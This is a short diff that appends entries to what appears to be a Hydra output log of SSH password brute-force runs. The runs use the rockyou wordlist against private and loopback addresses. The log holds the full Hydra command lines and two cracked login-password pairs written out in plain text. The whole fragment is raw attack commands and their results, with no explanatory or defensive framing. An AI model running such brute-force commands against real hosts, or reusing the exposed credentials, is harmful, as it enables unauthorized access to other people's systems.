@@ -35,3 +35,6 @@
 # Hydra v9.5 run at 2023-07-30 18:16:03 on 127.0.0.1 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://127.0.0.1)
 [22][ssh] host: 127.0.0.1   login: zero   password: 21RussellLucy
 # Hydra v9.5 run at 2023-08-05 13:17:57 on 192.168.1.47 ssh (hydra -l thomassegale -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.47)
+# Hydra v9.5 run at 2023-08-05 15:37:00 on 192.168.1.47 ssh (hydra -l nicole -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.47)
+# Hydra v9.5 run at 2023-08-05 15:45:19 on 10.211.55.8 ssh (hydra -l parallels -P rockyou.txt -t 64 -vV -o output.log -I ssh://10.211.55.8)
+[22][ssh] host: 10.211.55.8   login: parallels   password: Cmonster2006
